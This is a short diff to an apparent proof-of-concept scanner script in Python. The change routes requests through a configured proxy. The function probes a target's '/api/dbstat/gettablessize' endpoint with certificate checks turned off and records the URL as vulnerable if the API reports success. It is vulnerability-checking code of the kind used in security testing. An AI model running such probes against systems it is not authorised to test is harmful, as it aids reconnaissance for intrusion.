@@ -2,6 +2,7 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+from Config.config_proxies import proxies
 
 requests.packages.urllib3.disable_warnings()
 
@@ -20,7 +21,7 @@ def poc(target):
     }
 
     try:
-        r = requests.get(target+"/api/dbstat/gettablessize",headers=headers, verify=False,timeout=10)
+        r = requests.get(target+"/api/dbstat/gettablessize",headers=headers, verify=False,timeout=10,proxies=proxies)
 
         if r.status_code==200 and 'result":0,"reason":"success' in r.text:
             result['vurl'] = target + "/api/dbstat/gettablessize"
